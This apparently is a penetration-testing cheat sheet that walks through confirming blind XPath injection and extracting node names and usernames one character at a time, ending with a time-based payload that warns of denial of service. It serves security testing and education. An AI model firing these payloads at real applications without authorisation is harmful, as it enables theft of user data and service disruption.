If you have found a potentially blind XPath injection, then it can be confirmed following this methodology:

### Confirming the injection

First try to inject a payload that will result in a true statement:
```
invalid' or '1'='1
```
### Grabbing the Parent name
We can now try to exfiltrate the parent node's length with the following:
```
invalid' or string-length(name(/*[1]))=1 and '1'='1
```

Once we have confirmed the node length, we can try to grab the name:
```
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
```
### Determining modules under the parent
Once we have the parent node, we can attempt to determine modules under it. Use the following to determine the number of modules under the parent (/users/ is replaced with the parent name found)
```
invalid' or count(/users/*)=1 and '1'='1
```

Now that we know the length, we can try to determine the names of the child modules:
```
invalid' or substring(name(/user/*[1]),1,1)='a' and '1'='1
```
### Exfiltrating data
Once we've determined the names, we can try to data from the child nodes:
```
invalid' or string-length(/users/user[1]/username)=1 and '1'='1
````
### Time based approach
It's important to be careful with this payload, since large schema definitions can cause a DoS condition
```
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```
